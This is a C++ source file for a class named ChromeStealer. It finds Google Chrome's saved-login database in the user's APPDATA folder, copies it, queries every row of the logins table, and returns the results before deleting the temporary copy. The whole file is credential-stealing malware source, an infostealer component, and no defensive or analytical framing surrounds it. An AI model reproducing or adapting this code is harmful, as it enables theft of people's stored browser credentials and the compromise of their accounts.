#include "ChromeStealer.h"
#include <boost\compute\detail\getenv.hpp>
#include "StaticTools.h"
#include "SQLite3.hpp"

ChromeStealer::ChromeStealer(void)
{
	_appdataPath = std::string(boost::compute::detail::getenv("APPDATA"));
	_loginDatabasePath = boost::filesystem::path(_appdataPath + CHROME_FILE);
}

ChromeStealer::~ChromeStealer(void)
{	
}

const bool ChromeStealer::canSteal(void) const
{
	return boost::filesystem::exists(_loginDatabasePath);
}

const std::string ChromeStealer::stealPasswordList(void) const
{
	std::string ret;
	std::string tmp = StaticTools::GetProjectResourceDirectory() + "\\GoogleChromeLoginData";

	boost::filesystem::copy_file(_loginDatabasePath, tmp, boost::filesystem::copy_option::overwrite_if_exists);
	SQLite3 database(tmp);
	ret = database.execute("SELECT * FROM logins;", "stealer");
	database.close();
	boost::filesystem::remove(tmp);
	return (ret);
}
